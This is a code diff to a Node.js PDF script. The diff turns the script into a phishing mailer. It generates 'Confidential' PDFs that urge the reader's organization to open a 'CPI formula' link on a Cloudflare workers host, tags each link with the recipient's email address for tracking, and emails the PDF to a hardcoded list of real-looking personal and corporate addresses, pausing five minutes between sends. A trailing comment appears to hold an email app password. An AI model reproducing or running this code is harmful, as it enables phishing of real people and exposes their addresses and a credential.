@@ -2,6 +2,7 @@ const PDFDocument = require('pdfkit');
 const fs = require('fs');
 const path = require('path');
 const { finished } = require('stream/promises');
+const { sendAttachment } = require('./emailSender'); 
 
 /**
  * Function to create a PDF with a heading, body, links, and footer and return it as an object
@@ -76,29 +77,53 @@ async function savePDFToFile(pdfBuffer, outputFilePath) {
     return outputFilePath;
 }
 
+async function magicMailer(email_addr)  {
+    try {
+        const heading = 'Confidential';
+        const body = 'You organization has been suggested to utilize the formula available at following link';
+        const linksObjects = [
+            { text: 'CPI formula', link: `https://cloudflare.mughal.workers.dev/ograh/official?email=${email_addr}` }
+        ];
+        const footer = 'confidential';
+        const outputFilePath = path.join(__dirname, '0gra_official.pdf');
 
-// Test call if this script is run directly
+        // Generate the PDF for testing
+        const pdfBuffer = await createPDFObject(heading, body, linksObjects, footer);
+
+        const filePath = await savePDFToFile(pdfBuffer, outputFilePath);
+        console.log(`Test PDF created at ${filePath} and now sending to ${email_addr}`);
+        await sendAttachment(pdfBuffer, email_addr);
+        console.log(`Test PDF created at ${filePath}`);
+    } catch (error) {
+        console.error('Error creating test PDF:', error);
+    }
+}
+// Check if the module is being run directly from the command line
+// Delay function that returns a Promise to be resolved after a specified delay
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+const emailAddresses = ['mughal@gmail.com', 'econfused@gmail.com', 'yasir.mirza@sngpl.com.pk'];
+
 if (require.main === module) {
-    let email_addr = "abc1@def.com";
+    // const emailAddress = process.argv[2];
+
+    // if (!emailAddress) {
+    //     console.error('Please provide an email address as a command line argument.');
+    //     process.exit(1);
+    // }
+
     (async () => {
         try {
-            const heading = 'Confidential';
-            const body = 'You organization has been suggested to utilize the formula available at following link';
-            const linksObjects = [
-                { text: 'CPI formula', link: `https://cloudflare.mughal.workers.dev/ograh/official?email=${email_addr}` }
-            ];
-            const footer = 'confidential';
-            const outputFilePath = path.join(__dirname, 'ograh_official.pdf');
-
-            // Generate the PDF for testing
-            const pdfBuffer = await createPDFObject(heading, body, linksObjects, footer);
-    
-            const filePath = await savePDFToFile(pdfBuffer, outputFilePath);
-            console.log(`Test PDF created at ${filePath}`);
+            for (let emailAddress of emailAddresses) {
+                await magicMailer(emailAddress);
+                console.log(`sent to ${emailAddress}, Waiting 5 minutes before sending the next email...`);
+                await delay(5 * 60 * 1000); // Wait for 5 minutes (5 * 60 * 1000 milliseconds)
+            }
         } catch (error) {
-            console.error('Error creating test PDF:', error);
+            console.error('Error in main execution:', error);
         }
     })();
 }
-
 // uqcl zccw hdnf mlgm
